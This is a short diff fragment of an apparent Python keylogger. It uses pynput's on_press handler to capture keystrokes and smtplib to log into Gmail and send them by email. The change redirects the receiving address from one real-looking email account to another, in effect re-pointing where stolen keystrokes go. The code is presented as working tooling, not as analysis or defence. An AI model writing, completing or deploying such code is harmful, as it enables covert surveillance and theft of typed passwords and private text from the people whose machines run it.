@@ -9,7 +9,7 @@ server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(sender_email, password)
 
 ##RECIEVER MODEL##
-reciever_email ="sustainrobotics@gmail.com"
+reciever_email ="jackie@19degreesn.store"
 
 ### https://pypi.org/project/pynput/
 def on_press(key):
